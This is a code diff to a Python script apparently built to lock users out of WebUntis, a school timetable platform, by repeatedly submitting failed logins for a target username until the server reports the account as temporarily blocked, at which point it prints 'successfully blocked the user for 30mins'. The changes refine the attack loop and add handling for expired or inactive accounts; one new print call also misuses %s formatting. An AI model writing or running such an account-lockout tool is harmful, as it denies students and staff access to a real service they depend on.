@@ -76,7 +76,7 @@ class WebUntis():
                     validinput = True
                 except IndexError:
                     validinput = False
-            elif self.checkforint(school_input) is True:
+            elif school_input.isdigit() is True:
                 school = schoollist[int(school_input) - 1]
                 validinput = True
             else:
@@ -108,26 +108,21 @@ class WebUntis():
                 stringtext = results.get_text()
                 array = stringtext.split(';')
                 untis = array[3].strip()
-                untis = re.sub("\s\s+"," ", untis)
+                untis = re.sub(r"\s\s+"," ", untis)
                 untis = untis[18:-6].split(',"lastUserName"')[0] +"}}"
-                structjson = json.loads(untis)
+                login_status = json.loads(untis)
                 self.attempts += 1
             except IndexError:
                 print("invalid school input")
                 break
 
+            error_msg = login_status["loginServiceConfig"]["loginError"]
+
             print(f"attempts: {self.attempts}", end="\r")
-            if structjson["loginServiceConfig"]["loginError"] != "Invalid user name and/or password":
+            if error_msg == "User is temporarily blocked":
                 print("successfully blocked the user for 30mins")
                 break
-
-    def checkforint(self, value):
-        """func that checks if the given value is a int type"""
-        try:
-            int(value)
-            return True
-        except ValueError:
-            return False
-
+            elif error_msg == "Account expired" or error_msg == "User is inactive":
+                print("Failed to block %s, because his account expired or is inactive", self.payload['j_username'])
 
 WebUntis().main()
